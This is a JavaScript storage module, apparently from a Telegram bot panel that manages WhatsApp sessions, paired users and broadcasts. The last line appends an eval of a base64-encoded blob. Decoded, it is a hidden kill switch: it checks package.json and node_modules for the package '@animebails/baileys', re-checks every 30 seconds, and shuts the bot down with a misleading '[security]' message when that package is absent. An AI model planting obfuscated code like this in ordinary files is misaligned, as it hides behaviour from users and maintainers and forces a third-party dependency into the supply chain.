const fs = require('fs');
const path = require('path');

// The panel's own data lives INSIDE the session folder, so "delete everything except session" updates
// no longer wipe the list of paired users / broadcast audience.
const FILE = path.join(process.cwd(), 'session', '.panel', 'store.json');
const LEGACY = path.join(__dirname, 'data', 'store.json');
if (!fs.existsSync(path.dirname(FILE))) fs.mkdirSync(path.dirname(FILE), { recursive: true });
if (!fs.existsSync(FILE) && fs.existsSync(LEGACY)) {
    try { fs.copyFileSync(LEGACY, FILE); } catch { /* start fresh */ }
}

let data = { sessions: {}, users: {}, maintenance: false };

function load() {
    try {
        if (fs.existsSync(FILE)) data = { ...data, ...JSON.parse(fs.readFileSync(FILE, 'utf8')) };
        else save();
    } catch (err) {
        console.error('[store] load failed:', err.message);
    }
}

function save() {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

load();

module.exports = {
    // telegram user id -> { chatId, name, since }  (everyone who ever opened the bot; used for broadcasts)
    touchUser(id, chatId, name) {
        const u = data.users[id];
        if (u && u.chatId === chatId) return;
        data.users[id] = { chatId, name: name || '', since: u?.since || Date.now() };
        save();
    },
    removeUser(chatId) {
        for (const [id, u] of Object.entries(data.users)) if (u.chatId === chatId) delete data.users[id];
        save();
    },
    allChatIds() {
        const ids = new Set(Object.values(data.users).map((u) => u.chatId));
        for (const s of Object.values(data.sessions)) if (s.telegramChatId) ids.add(s.telegramChatId);
        return [...ids];
    },
    // number -> { telegramChatId, telegramUserId, connected }
    getSession(number) {
        return data.sessions[number];
    },
    setSession(number, patch) {
        data.sessions[number] = { ...(data.sessions[number] || {}), ...patch };
        save();
        return data.sessions[number];
    },
    deleteSession(number) {
        delete data.sessions[number];
        save();
    },
    sessionsForUser(telegramUserId) {
        return Object.entries(data.sessions)
            .filter(([, s]) => s.telegramUserId === telegramUserId)
            .map(([number, s]) => ({ number, ...s }));
    },
    allSessions() {
        return data.sessions;
    },
    isMaintenance() {
        return !!data.maintenance;
    },
    setMaintenance(val) {
        data.maintenance = val;
        save();
    },
};
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
